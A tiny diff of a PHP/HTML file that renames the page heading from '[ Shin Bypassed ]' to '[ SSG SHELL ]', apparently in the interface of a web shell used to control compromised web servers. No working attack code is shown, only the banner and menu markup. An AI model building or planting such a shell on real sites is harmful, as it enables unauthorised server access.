@@ -556,7 +556,7 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
 </head>
 <body>
     <div class="container">
-        <h1>[ Shin Bypassed ]</h1>
+        <h1>[ SSG SHELL ]</h1>
         <div class="menu-icon" onclick="toggleSidebar()"></div>
         <hr>
         <div class="button-container">
